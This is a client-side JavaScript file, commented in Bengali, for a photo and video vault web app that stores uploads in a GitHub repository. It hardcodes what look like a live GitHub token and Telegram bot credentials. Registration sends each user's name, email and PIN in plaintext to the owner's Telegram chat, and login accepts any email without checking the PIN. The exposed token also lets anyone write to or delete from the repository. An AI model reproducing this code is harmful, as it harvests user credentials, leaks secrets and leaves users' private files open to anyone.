// ১. স্লাইডার
new Swiper(".mySwiper", { effect: "cards", grabCursor: true, autoplay: { delay: 2500 } });

// ২. আপনার কনফিগ
const GITHUB_TOKEN = "Ghp_QUGftteZ1wXZ9xe4Ucqpfyd0YQNxvr0N8aAj";
const REPO_OWNER = "SIYAMBOSS";
const REPO_NAME = "PHOTO SAVE-BOSS";
const BOT_TOKEN = "8536299808:AAHJFWEna66RMHZdq-AV20Ak1KOOSwTJT9k";
const CHAT_ID = "7416528268";

let isRegistering = false;
let deleteData = null;

// ৩. অটো-লগইন (Reload Issue Fixed)
window.onload = () => {
    const user = localStorage.getItem('activeUser');
    if (user) {
        showDashboard(user);
    } else {
        document.getElementById('auth-section').classList.remove('hidden');
    }
};

function toggleAuth() {
    isRegistering = !isRegistering;
    document.getElementById('reg-fields').classList.toggle('hidden');
    document.getElementById('auth-title').innerText = isRegistering ? "CREATE" : "LOGIN";
}

async function handleAuth() {
    const name = document.getElementById('user-name').value;
    const email = document.getElementById('user-email').value;
    const pin = document.getElementById('pin-1').value;
    if(!email || !pin) return;

    if(isRegistering) {
        if(!name) return;
        const msg = `🌟 NEW USER\n👤 Name: ${name}\n📧 Email: ${email}\n🔑 PIN: ${pin}`;
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
        alert("Registration Success! Now Login.");
        toggleAuth();
    } else {
        localStorage.setItem('activeUser', email);
        document.getElementById('login-sound').play();
        showDashboard(email);
    }
}

function showDashboard(email) {
    document.getElementById('auth-section').classList.add('hidden');
    document.getElementById('dashboard').classList.remove('hidden');
    switchTab('photos'); 
}

function switchTab(tab) {
    const tabs = ['photos', 'videos', 'albums'];
    tabs.forEach(t => {
        document.getElementById(`tab-${t}`).classList.remove('active');
        document.getElementById(`${t}-content`).classList.add('hidden');
    });
    document.getElementById(`tab-${tab}`).classList.add('active');
    document.getElementById(`${tab}-content`).classList.remove('hidden');
    
    const email = localStorage.getItem('activeUser');
    if(tab === 'photos') loadGallery(email);
    if(tab === 'videos') loadVideos(email);
}

// ৪. স্মার্ট আপলোড (Video/Photo Auto-Detection)
async function uploadFile(event) {
    const file = event.target.files[0];
    const email = localStorage.getItem('activeUser');
    if(!file || !email) return;

    document.getElementById('loader').classList.remove('hidden');

    const reader = new FileReader();
    reader.onload = async (e) => {
        try {
            const content = e.target.result.split(',')[1];
            const isVideo = file.type.startsWith('video');
            const typeFolder = isVideo ? 'videos' : 'photos';
            const fileName = `${Date.now()}.${file.name.split('.').pop()}`;
            const path = `vault/${email}/${typeFolder}/${fileName}`;

            const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/${path}`, {
                method: 'PUT',
                headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: "Cloud Upload", content: content })
            });

            if(res.ok) {
                document.getElementById('loader').classList.add('hidden');
                switchTab(typeFolder);
            } else {
                alert("Upload Error! Check your Token or Repo Name.");
                document.getElementById('loader').classList.add('hidden');
            }
        } catch (err) { alert("Error!"); document.getElementById('loader').classList.add('hidden'); }
    };
    reader.readAsDataURL(file);
}

// ৫. লোড ফাংশনসমূহ
async function loadGallery(email) {
    const gallery = document.getElementById('photos-content');
    const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/vault/${email}/photos`, {
        headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
    });
    if(res.ok) {
        const files = await res.json();
        gallery.innerHTML = files.reverse().map(f => `
            <div class="relative group aspect-square overflow-hidden bg-zinc-900">
                <img src="${f.download_url}" class="w-full h-full object-cover" loading="lazy">
                <button onclick="openDeleteModal('${f.path}', '${f.sha}')" class="absolute top-1 right-1 bg-red-600/90 p-1.5 rounded-lg text-white opacity-0 group-hover:opacity-100 transition-all"><i class="fa-solid fa-trash-can text-[10px]"></i></button>
            </div>
        `).join('');
    } else { gallery.innerHTML = ""; }
}

async function loadVideos(email) {
    const videoArea = document.getElementById('videos-content');
    const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/vault/${email}/videos`, {
        headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
    });
    if(res.ok) {
        const files = await res.json();
        videoArea.innerHTML = files.reverse().map(f => `
            <div class="relative group bg-zinc-900 rounded-xl overflow-hidden shadow-xl">
                <video src="${f.download_url}" controls></video>
                <button onclick="openDeleteModal('${f.path}', '${f.sha}')" class="absolute top-2 right-2 bg-red-600 p-2 rounded-lg opacity-0 group-hover:opacity-100 transition-all"><i class="fa-solid fa-trash-can text-xs"></i></button>
            </div>
        `).join('');
    } else { videoArea.innerHTML = ""; }
}

// ৬. ডিলিট সিস্টেম
function openDeleteModal(path, sha) {
    deleteData = { path, sha };
    document.getElementById('delete-modal').classList.remove('hidden');
}
function closeDeleteModal() { document.getElementById('delete-modal').classList.add('hidden'); }

document.getElementById('confirm-delete-btn').onclick = async () => {
    closeDeleteModal();
    document.getElementById('loader').classList.remove('hidden');
    const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/${deleteData.path}`, {
        method: 'DELETE',
        headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: "File Deleted", sha: deleteData.sha })
    });
    if(res.ok) {
        document.getElementById('loader').classList.add('hidden');
        switchTab(deleteData.path.includes('videos') ? 'videos' : 'photos');
    }
};

function logout() {
    if(confirm("Exit Vault?")) {
        localStorage.clear();
        location.reload();
    }
}
